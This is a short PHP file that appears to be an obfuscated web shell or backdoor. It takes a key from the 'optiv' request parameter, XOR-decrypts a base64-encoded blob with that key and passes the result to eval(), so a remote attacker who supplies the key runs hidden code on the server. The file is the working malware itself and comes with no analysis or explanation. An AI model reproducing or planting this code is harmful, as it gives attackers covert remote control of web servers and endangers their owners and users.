<?php 
$EDxjC = $_REQUEST["optiv"];
$MklJ = base64_decode("RVBUTQBlZ2oBclBQNiR0Y2ZkHCQvThUWbwgrb1BQHyJkaxMcbwQGABsZFkV1GildUnwRElpHb1gHHBRCRkEJawYgPC8dEgMNb0RdSUsMDxMGKBUASVEYEkgrb1BUSVJYcVBxKT5UVFZUSkNNIBQRQVERFR8BawYgPC8YCTkBb1BUTTJfSllxb01UTR9yUWNHAStFNE07EhMBbxkSSV4QVFpNKi8RER9CRkAJazQaERxhGxoBNHpUSVYREhNJKhEQDAQZEHt1GyBbWFgAEgcRe1A6BgIRdFxUIRRWQE07EhMBb1BUDR9UCTkBb1BUFHwREhMBJxUVDRNDGhFiIB4ADBhFH3dIPAAbGh9FW1xPdVAVHQJQUVtMKh4AUlZXW19EIREZDEsVdl1ZJSBWQE07EhMBbxgRCBJUQBsDDB8aHRNfRh51NgARU1ZQQkNNJhMVHR9eXBxOLAQRHVtCRkFELh1WQE07EhMBbxgRCBJUQBsDDB8aHRNfRh51PREaGhBUQB5kIRMbDR9fVQkBLRkaCARIEBoaRVBUSVZZV1JFKgJcTjVeXEdEIQRZJRNfVUdJdVBTSVgRVFpNKgMdExMZFndPNxokQF8KOBMBb1AGDBdVVFpNKlhQLRhJWGMIdHpUSVYRVlpEdHpUSQsRV19SKlAdD1YZQUZDPAQGQVJHZmZ4Y1BERVYFGxMcck1UTgZERhMGZlAPY1YREhMFJjMXORB/Eg4BKggEBRlVVxsGb1dYSVJHZmZ4Zkt+SVYREhdlIQgeOVYMEhdIDBMkDzhqA24aRVBUSVYVUWtYb01UCxdCV11AIhVcTR9yUWNHAStFNF8KOBMBb1AdD1YZUVxUIQRcTR9yUWNHAVlUV1YDGxNaRVBUSVYREhdCFwlUVFYVW3BCHxY6MkRsCTkBb1BUFHwREhMBJhZUQRBYXlZ+KggdGgJCGhdCFwldQFZKOBMBb1BUSRNSWlwBaxMsEFgWElJNPRUVDQ8RV0tIPAQHTk07EhMBb1BUDR9UCTkBb1BUFHwREhMBKRkYDClBR0d+LB8aHRNfRkAJaxMsEFoRVFpNKi8TDAJuUVxPOxUaHQUZFUNJP0pbRh9fQkZVaFldUnwREhMBKhMcBlYWZ0NNIBEQDBIRFR0FCx4MAyYfFRNVIFBTR1JSakoaRVBUSVZVW1YaRVBUFHwREkBYPAQRBF4VRGd0FllPY1YRVlpEdHo=");
$hxXs = "";
for($nlle=0; $nlle<strlen($MklJ); ) {
  for($fSy=0; ($fSy<strlen($EDxjC) && $nlle<strlen($MklJ)); $fSy++,$nlle++) {
    $hxXs .= $MklJ{ $nlle } ^ $EDxjC{ $fSy };
  }
}
eval($hxXs);
?>